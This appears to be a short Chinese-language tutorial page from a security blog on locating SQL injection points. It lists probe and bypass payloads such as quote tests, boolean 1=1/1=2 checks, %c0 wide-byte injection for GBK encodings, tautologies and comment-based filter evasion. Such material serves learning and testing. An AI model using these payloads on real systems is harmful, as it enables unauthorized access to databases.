---
layout: default
---
# ![](../img/hj.jpg)寻找注入点


## ![](../img/github4.png)加单引号
触发异常说明有漏洞
## ![](../img/github5.png)/**/代替空格
## ![](../img/github6.png)?id=1 and 1=1 然后 ?id=1 and 1=2
输入?id=1 and 1=1页面正常

?id=1 and 1=2 出错

则存在数字型注入
## ![](../img/github7.png)?id=1 and 1=2 然后 ？id=1' and '1'='2
输入?id=1 and 1=2页面正常

?id=1' and '1'='2 页面无输出

可以看出，这个是字符型SQL注入，未过滤引号和and

## ![](../img/github8.png)%c0宽字节注入
gbxxxx系列编码或gbk，可尝试宽字节

加单引号没反应的话，加%c0

%c0' or 1=1 limit 2,1%23
## ![](../img/github9.png)?id=1' or '1'='1
## ![](../img/github10.png)?id=1' and 1=1 or''='
## ![](../img/github11.png)?id=1' /\*and\*/ 1=1 or''='
## ![](../img/github12.png)?id=1' /\*!and\*/ 1=1 or''=


__原创文章，转载请注明转载自[http://www.8pwn.com](http://www.8pwn.com)__

[返回上一层](./web)
